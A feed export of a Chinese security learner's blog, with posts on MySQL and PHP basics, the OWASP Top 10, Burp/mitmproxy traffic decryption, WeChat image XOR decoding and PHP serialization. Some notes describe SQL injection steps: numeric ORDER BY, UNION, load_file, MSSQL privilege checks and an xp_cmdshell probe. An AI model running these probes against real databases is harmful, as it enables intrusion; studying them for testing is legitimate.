<p>Bp中显示的效果如下：</p>
<p><img src="image-20240727195223677.png" alt="image-20240727195223677"></p>
<p>假设有一个web系统，请求和响应全加密。借助这套MITM可以达到：</p>
<p>浏览器 - Burp： 下游代理 request()    bp明文显示浏览器发送的加密过的请求</p>
<p>Burp - 服务器： 上游代理 request()    bp修改后，重新加密发给服务器，以便服务器正常响应</p>
<p>服务器 - Burp： 上游代理 reponse()    bp明文显示服务器返回的加密过的响应</p>
<p>Burp - 浏览器： 下游代理 reponse()    重新加密返回给浏览器，以便浏览器显示正常</p>
<p>再把流程图贴一下：</p>
<p><img src="image-20240725151939367-1721907091291-1.png" alt="image-20240725151939367"></p>
<h2 id="优化代码"><a href="#优化代码" class="headerlink" title="优化代码"></a>优化代码</h2><p>优化一下代码，方便写加解密过程：</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> Mitmproxy/mitmdump中文文档以及配置教程：<a class="link" href="https://www.cnblogs.com/yoyo1216/p/16165758.html">https://www.cnblogs.com/yoyo1216/p/16165758.html<i class="fas fa-external-link-alt"></i></a></p>
<p>Mitmdump 和 Burp Suite整合详解：<a class="link" href="https://xz.aliyun.com/t/13218?time__1311=GqmxuD070=o05Rx+OrmwK0KqY5kWbD#toc-5">https://xz.aliyun.com/t/13218?time__1311=GqmxuD070%3Do05Rx%2BOrmwK0KqY5kWbD#toc-5<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>MYSQL简单使用</title>
    <url>/2019/07/31/MYSQL%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11252206.html">源地址：https://www.cnblogs.com/This-is-Y/p/11252206.html<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p><strong>安装：</strong></p>
<p>安装phpstudy，通过phpstdy来学习MySQL。</p>
<img src="1503868-20190726174305966-1191081252.png" alt>

<p>然后登陆mysql，使用你的密码登陆（默认是root）<img src="1503868-20190726174419670-239530772.png" alt></p>
<p>之后就可以开始学习mysql语句了。</p>
<p> </p>
<p><strong>使用：</strong></p>
<p>mysql语句不区分大小写，每一个命令都是以；结束（如create database sqlname;）</p>
<p>\h获取帮助</p>
<p>\c退出编辑（如图<strong>）</strong></p>
<img src="1503868-20190726174750242-2119898869.png" alt>

<p> 进入’&gt;模式时，使用\c退出到-&gt;(如图）</p>
<img src="1503868-20190726183015187-2081354509.png" alt>

<p><strong>增加：</strong>CREATE DATABASE ’数据表名字‘;（如create database sqlname;）</p>
<p><strong>创建内容：</strong></p>
<p>create table teacher(<br>id int(4) not null primary key auto_increment,<br>name char(20) not null,<br>sex char(10) not null,<br>addr char(10) not null<br>);</p>
<p><strong>插入数据：</strong>insert into teacher(name,sex,addr) values(‘Y’,’male’,’jxpx’);</p>
<p><strong>检索数据：</strong></p>
<p>　　1，* 通配符：</p>
<p>　　select * from teacher;（*表示所有，这个select关键字本来是查找某个数据）</p>
<p>　　之后就是这个样子：</p>
<p>　　<img src="1503868-20190726180413393-298999237.png" alt></p>
<p>　　2，distinct  （独特的）关键字，不显示重复的。如：</p>
<p>　　select distinct name from teacher;</p>
<p>　　<img src="1503868-20190903154742321-553056492.png" alt></p>
<p>　　然后就是：</p>
<p>　　<img src="1503868-20190903154826628-347624395.png" alt></p>
<p> </p>
<p> 　　3，限制数据</p>
<p>　　在各个数据库中的实现各不一样</p>
<p>　　　　SQL Server和Access中：select top 4 id from teacher；</p>
<p>　　　　DB2：select id from teacher fetch first 5 rows only；</p>
<p>　　　　Oracle：select id from teacher where rownum &lt;= 5;</p>
<p>　　　　MySQL,MariaDB,PostgreSQL,SQLite:select id from teacher limit 5;</p>
<p>　　　　</p>
<p> </p>
<p> </p>
<p><strong>切换到一个数据库：</strong>use ’数据表名字‘；（如use test）</p>
<p><strong>显示所有数据库：</strong>show databases；</p>
<p>　　如图：</p>
<p>　　<img src="1503868-20190726180540474-991019553.png" alt></p>
<p><strong>在数据库中显示数据表：</strong>show tables;</p>
<img src="1503868-20190731225436333-354448396.png" alt>

<p><strong>更新数据：</strong> update teacher set name=’Josely’ where id=5;</p>
<p>　　<img src="1503868-20190726181733881-1808131227.png" alt></p>
<p>　　更新前：<img src="1503868-20190726181853465-400935725.png" alt>   更新后：<img src="1503868-20190726182008351-600678085.png" alt></p>
<p> </p>
<p><strong>删除数据：</strong> delete from teacher where id=5; </p>
<p> 删除前：参考前面的图，删除后：</p>
<img src="1503868-20190726182257158-907567071.png" alt>

<h5 id><a href="#" class="headerlink" title></a></h5><p><strong>where句子：</strong></p>
<p>　　select 你要的信息 from 一个表或者多个表 where 满足的条件（判断）</p>
<p>　　如：select * from teacher where sex=‘male’；</p>
<p>　　<img src="1503868-20190726183130016-1736347318.png" alt></p>
<p>　　如：select name from teacher where sex=‘male’；</p>
<p>　　<img src="1503868-20190726183202319-928833568.png" alt></p>
<p> 　　where 语句可以加上and 与or 进行连接，以及（）</p>
<p><strong>order by 语句：</strong></p>
<p>select 你要的信息 from 一个表或者多个表 order by 字段 asc/desc</p>
<p>asc与desc表示正序与逆序（默认为asc，可以不写）</p>
<p>如 select * from teacher order by name;</p>
<img src="1503868-20190726183724028-1486939311.png" alt>

<p>select * from teacher order by name desc</p>
<img src="1503868-20190726184011865-1450854214.png" alt>

<p> </p>
<p><strong>此时，注意，order by 后面可以加数字（在sqli中有用的）</strong></p>
<p>select * from teacher order by 1;（1=id）</p>
<p>select * from teacher order by 2;（2=name）</p>
<p>select * from teacher order by 3;（3=sex）</p>
<p>select * from teacher order by 4;（4=addr）</p>
<p> </p>
<p><strong>like 操作符：</strong></p>
<p>**　　**创建比较特殊数据的搜索模式</p>
<p>　　样例表：</p>
<p>　　<img src="1503868-20190903223351953-887640450.png" alt></p>
<p>　　1:%　　表示任意字符出现任意次数</p>
<p>　　　　如：select * from student where name like ‘l%’;</p>
<p>　　　　<img src="1503868-20190903223642174-55506609.png" alt></p>
<p>　　2:_　　 用法与%一样，但是只匹配单个字符</p>
<p>　　　　如：select * from student where name like ‘<em>j</em>‘</p>
<p>　　　　<img src="1503868-20190903223611288-393900627.png" alt></p>
<p>　　3:[] 　　指定一个字符集，他必须匹配指定位置（通配符的位置）的一个字符</p>
<p>　　　　如：……我的MYSQL用不了[]…………淦</p>
<p> </p>
<p><strong>字段：</strong></p>
<p>**　　**字段连接：‘+’只能连接数字，连接字符串要用concat（）</p>
<p>　　<img src="1503868-20190903234352743-1565143818.png" alt></p>
<p>　　<img src="1503868-20190903234151893-1389936975.png" alt></p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>union语句：</strong></p>
<p>select 需要的信息 from 数据表1 union select 需要的信息 from 数据表2 </p>
<p>如图两个表：</p>
<img src="1503868-20190731230904907-661461468.png" alt>

<p>使用select name from student union select name from teacher;后，</p>
<img src="1503868-20190731231031153-841213505.png" alt>

<p>值得注意的是，这样子写，不会显示重复的（name为Y的两个数据只显示一个）</p>
<p>要显示两个，应使用union all。</p>
<p> select name from student union all select name from teacher;</p>
<p>效果如下图</p>
<p> <img src="1503868-20190731231203944-655228719.png" alt></p>
<p>使用union，还可以这样子玩：</p>
<img src="1503868-20190731232146899-1220530028.png" alt>

<p> </p>
<p> <strong>注释：</strong></p>
<p>使用#字符，或– （减号减号空格）来注释单行，还有一个/*   */。</p>
<img src="1503868-20190731231425498-1057335509.png" alt>

<img src="1503868-20190731231541124-538656639.png" alt>

<p> </p>
<p> <strong>内置函数：</strong></p>
<p> database():</p>
<img src="1503868-20190731232650168-85759288.png" alt>

<p> </p>
<p>load_file(‘写文件路径’):</p>
<img src="1503868-20190731235335003-1766633922.png" alt>

<p>（不知道为啥没有。。。。）</p>
<p>current_user:</p>
<img src="1503868-20190731232713203-1952569957.png" alt>

<p> </p>
<p>当出现<img src="1503868-20190903140043228-1854590949.png" alt>时：</p>
<p> </p>
<p>原因是没有选择一个数据库，可以先show databases；查看有哪些数据库，再use ’数据库名‘ 来使用一个数据库。</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>XML笔记</title>
    <url>/2024/06/06/Mssql%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="判断当前用户角色（权限）"><a href="#判断当前用户角色（权限）" class="headerlink" title="判断当前用户角色（权限）"></a>判断当前用户角色（权限）</h2><ol>
<li><p>判断是否是sysadmin（dba权限），执行<code>select is_srvrolemember(&#39;sysadmin&#39;)</code></p>
</li>
<li><p>判断是否是db_owner（dbo权限)，执行<code>select is_member(&#39;db_owner&#39;)</code></p>
</li>
<li><p>判断是否是public（普通权限），执行<code>select is_srvrolemember(&#39;public&#39;)/select is_member(&#39;public&#39;)</code></p>
</li>
</ol>
<h2 id="判断xp-cmdshell是否存在"><a href="#判断xp-cmdshell是否存在" class="headerlink" title="判断xp_cmdshell是否存在"></a>判断xp_cmdshell是否存在</h2><p><code> select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;</code></p>
<p>返回1证明存在xp_cmdshell</p>
]]></content>
  </entry>
  <entry>
    <title>OWASP Top10</title>
    <url>/2021/05/12/OWASP-Top10-This-is-Y/</url>
    <content><![CDATA[<h1 id="A1-注入"><a href="#A1-注入" class="headerlink" title="A1 注入"></a>A1 注入</h1><p>  将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
<h1 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h1><p>  通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
<h1 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h1><p>  许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
<h1 id="A4-XML外部实体（XXE）"><a href="#A4-XML外部实体（XXE）" class="headerlink" title="A4 XML外部实体（XXE）"></a>A4 XML外部实体（XXE）</h1><p>  许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
<h1 id="A5-失效的访问控制"><a href="#A5-失效的访问控制" class="headerlink" title="A5 失效的访问控制"></a>A5 失效的访问控制</h1><p>  未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
<h1 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h1><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
<h1 id="A7-跨站脚本（XSS）"><a href="#A7-跨站脚本（XSS）" class="headerlink" title="A7 跨站脚本（XSS）"></a>A7 跨站脚本（XSS）</h1><p>  当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
<h1 id="A8-不安全的反序列化"><a href="#A8-不安全的反序列化" class="headerlink" title="A8 不安全的反序列化"></a>A8 不安全的反序列化</h1><p>  不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
<h1 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h1><p>  组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
<h1 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h1><p>  不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
<p>pdf： [OWASP Top 10 2017 4e2d65877248v1.0-2.pdf](......\0_IDM_Download\OWASP Top 10 2017 4e2d65877248v1.0-2.pdf) </p>
]]></content>
  </entry>
  <entry>
    <title>PCvx图片解密</title>
    <url>/2021/07/31/PCvx%E5%9B%BE%E7%89%87%E8%A7%A3%E5%AF%86-This-is-Y/</url>
    <content><![CDATA[<p>今天偶然看到一篇文章，思路很棒，值得学习<br><a class="link" href="https://mp.weixin.qq.com/s/rvkhkvirdq6Ab64n-lIn0Q">https://mp.weixin.qq.com/s/rvkhkvirdq6Ab64n-lIn0Q<i class="fas fa-external-link-alt"></i></a></p>
<p>PCvx的文件路径一般放在C盘的文档下的WeChat Files里，每个账号的vxID就是文件夹名<br><img src="image-20210731202818613.png" alt="image-20210731202818613"></p>
<p>图片一般是这个位置<br><img src="image-20210731202931124.png" alt="image-20210731202931124"></p>
<p>拿出一张图片，用winhex打开看16进制，文件头是 DE 07<br><img src="image-20210731203238002.png" alt="image-20210731203238002"></p>
<p>同时，png图片的文件头是89 50<br>DE XOR 89= 57，而同时，07 XOR 50 =57</p>
<p>写一个小脚本跑一下<br>核心代码就这几行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> fr:</span><br><span class="line">        fr = fr.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> fw:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> fr:</span><br><span class="line">                a += <span class="number">1</span></span><br><span class="line">                <span class="comment"># print(i,i^87,bytes([i^87]))</span></span><br><span class="line">                fw.write(<span class="built_in">bytes</span>([i^<span class="number">87</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要是想记录一下<br>python用二进制读取文件（rb）的时候，如果直接遍历用print输出，得到的是每一个字节的10进制，就比如这个文件，读前16个字节，<br>第一排是直接print得到的，第二排是把第一排的结果转成了16进制，第三排是winhex的显示<br><img src="image-20210731210837422.png" alt="image-20210731210837422"><br>要进行异或的时候，要与得到的值（57（实际上应该要写0x57））的十进制（87）异或。<br>最后写入的时候，也要用二进制的方式（wb)，直接把结果写入是不行的，需要用bytes转换一下</p>
<p>常用文件及其文件头<br>|文件名|文件头|<br>|—|–|<br>|JPEG (jpg) | FF  D8  FF  E1   |<br>|PNG (png) | 89  50  4E  47   |<br>|GIF (gif) | 47  49  46  38   |<br>|TIFF (tif) | 49  49  2A  00   |<br>|Windows Bitmap (bmp) | 42  4D   |<br>|CAD (dwg) | 41  43  31  30   |<br>|Adobe Photoshop (psd) | 38  42  50  53   |<br>|Rich Text Format (rtf) | 7B  5C  72  74  66   |<br>|XML (xml) | 3C  3F  78  6D  6C   |<br>|HTML (html) | 68  74  6D  6C  3E   |<br>|Email [thorough only] (eml) | 44  65  6C  69  76  65  72  79  2D  64  61  74  65  3A   |<br>|Outlook Express (dbx) | CF  AD  12  FE  C5  FD  74  6F   |<br>|Outlook (pst) | 21  42  44  4E   |<br>|MS Word/Excel (xls.or.doc) | D0  CF  11  E0   |<br>|MS Access (mdb) | 53  74  61  6E  64  61  72  64  20  4A   |<br>|WordPerfect (wpd) | FF  57  50  43   |<br>|Postscript (eps.or.ps) | 25  21  50  53  2D  41  64  6F  62  65   |<br>|Adobe Acrobat (pdf) | 25  50  44  46  2D  31  2E   |<br>|Quicken (qdf) | AC  9E  BD  8F   |<br>|Windows Password (pwl) | E3  82  85  96   |<br>|ZIP Archive (zip) | 50  4B  03  04   |<br>|RAR Archive (rar) | 52  61  72  21   |<br>|Wave (wav) | 57  41  56  45   |<br>|AVI (avi) | 41  56  49  20   |<br>|Real Audio (ram) | 2E  72  61  FD   |<br>|Real Media (rm) | 2E  52  4D  46   |<br>|MPEG (mpg) | 00  00  01  BA   |<br>|MPEG (mpg) | 00  00  01  B3   |<br>|Quicktime (mov) | 6D  6F  6F  76   |<br>|Windows Media (asf) | 30  26  B2  75  8E  66  CF  11   |<br>|MIDI (mid) | 4D  54  68  64   |</p>
]]></content>
  </entry>
  <entry>
    <title>PHP学习笔记</title>
    <url>/2019/09/08/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11466633.html">源地址：https://www.cnblogs.com/This-is-Y/p/11466633.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>准备工作：</strong></p>
<p>　　首先打开notepad++，新建文件，选择PHP语言，打开这个插件管理</p>
<p>　　<img src="1503868-20190905154502363-135413426.png" alt></p>
<p> </p>
<p> 　　找到NPPEXEC插件（我这里已经安装了）：</p>
<p>　　<img src="1503868-20190905154624355-286798278.png" alt></p>
<p> </p>
<p> </p>
<p> 　　然后退出来，写一个最简单的php代码，echo啥的，然后按下F6，在弹出的command界面中输入</p>
<p> 　　</p>
<p>　　cd $(CURRENT_DIRECTORY)<br>   　　E:\phpStudy\PHPTutorial\php\php-7.2.1-nts\php.exe $(FULL_CURRENT_PATH)</p>
<p>　　之后点击ok就可以运行了</p>
<p>　　<img src="1503868-20190905154802364-1439181856.png" alt></p>
<p>　　</p>
<p>　　（这里的E:\phpStudy\PHPTutorial\php\php-7.2.1-nts\php.exe是你安装的php的位置，因为我使用的是phpstudy，所以直接用phpstudy里面的php</p>
<p>　　php文件不要有空格，可以有下划线，不然在运行时会报错，什么什么，如图<img src="1503868-20190905155334351-1321611837.png" alt>）</p>
<p> </p>
<p> 　　</p>
<p>　　如果你之前有使用过phpstudy的话，可以把php代码文件放在phpstudy的www文件夹中，这样子的话，你可以通过开启phpstudy，然后访问127.0.0.1/php代码文件名（要加上.php)来直接运行你的php文件，比在notepad++中更直观</p>
<p>　　举个例子，</p>
<p>　　<img src="1503868-20190905155901401-479557064.png" alt></p>
<p> </p>
<p> </p>
<p> </p>
<p> 　　我的代码文件名叫new2.php，放在www文件夹里的php文件夹中，这样子就可以直接打开了，hello world，这是我的代码　</p>
<p>　　　<img src="1503868-20190905155729352-1664413383.png" alt>　　　　　　</p>
<p>　　　　 　　</p>
<p>　　简单代码：</p>
<p> </p>
<p> 　　<img src="1503868-20190905162323431-2071707038.png" alt></p>
<p> </p>
<p> </p>
<p> </p>
<p>　　</p>
<p>　　PHP是一个Web编程语言，在编程过程中难免会遇到用echo来输出大段的html和javascript脚本的情况，如果用传统的输出方法 ——按字符串输出的话，肯定要有大量的转义符来对字符串中的引号等特殊字符进行转义，以免出现语法错误。如果是一两处还可以容忍，但是要是一个完整的 html文本或者是一个200行的js我想是谁都会崩溃的。这就是PHP为什么要引入一个定界符的原因——至少一大部分原因是这样的。</p>
<p>1.<strong>PHP定界符的作用就是按照原样，包括换行格式什么的，输出在其内部的东西；</strong></p>
<p>2.在PHP定界符中的任何特殊字符都不需要转义。</p>
<p>3.PHP定界符中的PHP变量会被正常的用其值来替换。</p>
<p>4.位于开始标记和结束标记之间的变量可以被正常解析，<strong>但是函数则不可以</strong>。</p>
<p><strong>PHP中的定界符格式是这样的：</strong></p>
<p>&lt;&lt;&lt;Eof<br>……<br>Eof;</p>
<p> 　　(只需要前后一致即可，EOF不是固定的，EOT，ETO什么什么的都可以)</p>
<p>　　参考<a class="link" href="https://www.cnblogs.com/jcs-cs-s/p/6922190.html">https://www.cnblogs.com/jcs-cs-s/p/6922190.html<i class="fas fa-external-link-alt"></i></a></p>
<p>　　 </p>
<p>　　此外，php中也有print，它与echo的区别在于</p>
<ul>
<li>echo - 可以输出一个或多个字符串</li>
<li>print - 只允许输出一个字符串，返回值总为1</li>
</ul>
<p>**　　提示：** echo输出的速度比print fast，echo no有返回值，print有返回值1。</p>
<p>　　括号与单双引号的效果粗略来说都是一样的</p>
<p>　　　　</p>
<p><strong>类型比较</strong></p>
<p>　　==与===</p>
<ul>
<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>
<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>
</ul>
<p>　　对与多种类型的比较，参考（<a class="link" href="https://www.runoob.com/php/php-types-comparisons.html">https://www.runoob.com/php/php-types-comparisons.html<i class="fas fa-external-link-alt"></i></a>）</p>
<p>　　</p>
<p><strong>常量</strong></p>
<p>　　</p>
<h2 id="设置-PHP-常量"><a href="#设置-PHP-常量" class="headerlink" title="设置 PHP 常量"></a>设置 PHP 常量</h2><p>　　设置常量，使用 define() 函数，函数语法如下：</p>
<p>　　该函数有三个参数:</p>
<ul>
<li><strong>name：</strong>必选参数，常量名称，即标志符。</li>
<li><strong>value：</strong>必选参数，常量的值。</li>
<li>**case_insensitive **：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li>
</ul>
<p>　　定义常量有两种方式：define与const</p>
<p>　　一般是define在类外定义常量，const在类内定义常量，并且const必须通过类名::变量名来进行访问。但是php5.3以上支持类外通过const定义常量</p>
<p>　　</p>
<p><strong>字符串</strong></p>
<p>　　PHP并置运算符（.）</p>
<p> 　　strlen():计算字符长度</p>
<p>　　strpos(A;B):在A中搜索B关键字</p>
<p>　　</p>
<p><strong>数组：</strong></p>
<ul>
<li><strong>数值数组</strong> - 带有数字 ID 键的数组</li>
<li><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</li>
<li><strong>多维数组</strong> - 包含一个或多个数组的数组</li>
</ul>
<p>　　数值数组和C语言的数组一样，差不太多</p>
<p>　　关联数组类似python的字典，具体用法如下：</p>
<p>　　<img src="1503868-20190907220838420-1942367434.png" alt></p>
<p> </p>
<p> 　　代码输出如上</p>
<p>　　foreach():来遍历关联数组中的元素</p>
<p>　　 count():计算数组长度</p>
<p>　　多维数组之后再接受，留个坑</p>
<p> </p>
<p><strong>数组排序:</strong></p>
<ul>
<li>sort（） - 对数组进行升序排列</li>
<li>rsort（） - 对数组进行降序排列</li>
<li>asort（） - 根据关联数组的值，对数组进行升序排列</li>
<li>ksort（） - 根据关联数组的键，对数组进行升序排列</li>
<li>arsort（） - 根据关联数组的值，对数组进行降序排列</li>
<li>krsort（） - 根据关联数组的键，对数组进行降序排列</li>
</ul>
<p>　　挺简单的。。。。maybe</p>
<p>　　详细参考：<a class="link" href="https://www.runoob.com/php/php-arrays-sort.html">https://www.runoob.com/php/php-arrays-sort.html<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p><strong>超级全局变量：</strong></p>
<p>　　好多好多，，，我也不想看，我也不想写</p>
<p>**　　**直接给个链接吧</p>
<p>**　　**<a class="link" href="https://www.runoob.com/php/php-superglobals.html">https://www.runoob.com/php/php-superglobals.html<i class="fas fa-external-link-alt"></i></a></p>
<p>　　里边还有$_REQUEST，$_POST和$_GET </p>
<p> <strong>函数：</strong></p>
<p>**　　**使用function()关键字，传参，返回值，什么什么的，都一样，八九不离十。粗略来看如此。</p>
<p>　　毕竟我也只求一个看得懂php代码。</p>
<p><strong>魔术常量：</strong></p>
<p>**　　**(下面的都是由两个下划线组成的，前后一共4个下划线)</p>
<ol>
<li>**　　**<strong>LINE</strong>:返回当前行号</li><li>**　　**__FILE__:返回文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。
自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。
</li>
<li>　　__DIR__:返回文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。
它等价于 dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。
</li>
<li>　　<strong>FUNCTION</strong>:返回函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。</li>
<li>　　<strong>CLASS</strong>:返回类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。</li>
<li>       <strong>TRAIT</strong>:首先你得知道什么是trait（参考：<a class="link" href="https://www.php.net/manual/zh/language.oop5.traits.php">https://www.php.net/manual/zh/language.oop5.traits.php<i class="fas fa-external-link-alt"></i></a>（坦白说，我没搞懂））。返回Trait 的名字（PHP 5.4.0 新加）</li>
<li>　　<strong>METHOD</strong>:返回类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</li>
<li>　　<strong>NAMESPACE</strong>:返回当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。</li>
</ol>
<p>　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　（我猜，，，这些东西有时候还是挺有用的）</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>PHP序列化入门</title>
    <url>/2020/03/12/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12469046.html">源地址：https://www.cnblogs.com/This-is-Y/p/12469046.html<i class="fas fa-external-link-alt"></i></a></p>
<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p>
<p>php序列化的作用：</p>
<p>上面的话翻译的直白一点就是方便存储和运输以及传递，举个例子就是：如果想把一个数组或者是对象存储到文件或数据库中，怎么办。不能像字符串那样的存储吧。所以在存储数组或对象之前先对数据进行serialize,在取回内容时再unserialize</p>
<p>也许有人回想，json不也一样吗，我也这样想过，所以去找了一下json和序列化的查别以及优缺点</p>
<p>这里我只把优缺点结果贴出来，详细对比过程可以去这个帖子里看：<a class="link" href="https://blog.51cto.com/zhweizhi/1952116">https://blog.51cto.com/zhweizhi/1952116<i class="fas fa-external-link-alt"></i></a></p>
<p> <br>| |json|serialize<br>|优点|- 变量序列化后依然可读- 可以给其他系统使用，因为JSON格式是标准的|- 允许非UTF-8的变量- 支持除了stdClass 示例外的其他实例</p>
<li>
允许非UTF-8的变量
</li>
<li>
支持除了stdClass 示例外的其他实例
</li>
|缺点|- 只对UFT-8的数据有效，其他编码可能不能很好工作- 只对stdClass类的示例有效|- 编码后的文本对人来说是不可读的- 无法被其他语言的系统引用

<li>
编码后的文本对人来说是不可读的
</li>
<li>
无法被其他语言的系统引用
</li>

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>同时在那篇文章最后可以看到：</p>
<p>“我们发现，<strong>json序列化和反序列化丢失了类中的私有成员变量，而serialize序列化和反序列化只要是类的变量都可以，但是类的成员方法都无法进行序列化和反序列化。</strong></p>
<p>在一般情况，还是使用json比较好，因为json是跨平台的通用格式，除了json，用xml也比较好。那在什么时候使用serialize方式呢？</p>
<p><strong>在对一个类进行****serialize反序列化的时候会默认调用魔术方法__wakeUp()，这样就使得对象能够重新建立起序列化时未能保留的各种状态。例如：数据库连接等。</strong>那就是另外一个问题了，这里不做深究了。”</p>
<p>再重新说回serialize序列化</p>
<p>serialize()  　　//将一个对象转化成一个字符串</p>
<p>unserialize() 　 //将一个字符串转化成一个对象</p>
<p>解释一下怎么看serialize的结果</p>
<p>O:4:”test”表示object名字有四个字符串</p>
<p>:3表示对象属性有点两个(flag,a)</p>
<p>{}里的是属性的值</p>
<ul>
<li>　　s:10:”testflag”表示string类型，长度为10，值为”testflag”</li>
<li>　　i:1234表示int类型，值为1234</li>
</ul>
<p>这里有个细节要注意，flag只有4，testflag也只有8，但是这里显示的长度却是10。这是因为它是private属性，翻阅文档就可以看到说明，它会在两侧加入空字节。所以在传入序列化字符串进行反序列化时需要注意补齐两个空字节。</p>
<p>再扯一下public、protected、private下序列化对象的区别</p>
<li>public变量
<ul>
- 　　直接变量名反序列化出来

<ul>
<li><p>    \x00 + * + \x00 + 变量名</p>
</li>
<li><p>    \x00 + 类名 + \x00 + 变量名</p>
</li>
</ul>
<p> </p>
<p> </p>
<p>比较重要的两个方法：</p>
